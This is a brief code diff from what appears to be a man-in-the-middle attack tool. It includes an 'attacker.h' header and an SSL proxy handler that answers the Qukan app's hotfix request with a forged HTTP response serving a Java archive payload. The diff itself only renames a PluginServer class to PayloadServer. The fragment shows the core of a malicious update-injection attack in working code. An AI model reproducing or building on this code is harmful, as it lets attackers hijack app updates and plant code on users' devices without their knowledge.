@@ -1,5 +1,5 @@
 #include "qukan.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "sslPublic.h"
 #include "../cipher/CryptoUtils.h"
@@ -115,7 +115,7 @@ int Qukan::replyQukanHotfix(char*lpbuffer, int len, int buflimit, LPSSLPROXYPARA
 		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/java-archive\r\nContent-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(pstSSLProxyParam->username, zipfn);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
 		return ret;
 
 	}else if (gQukanFlag == 4)
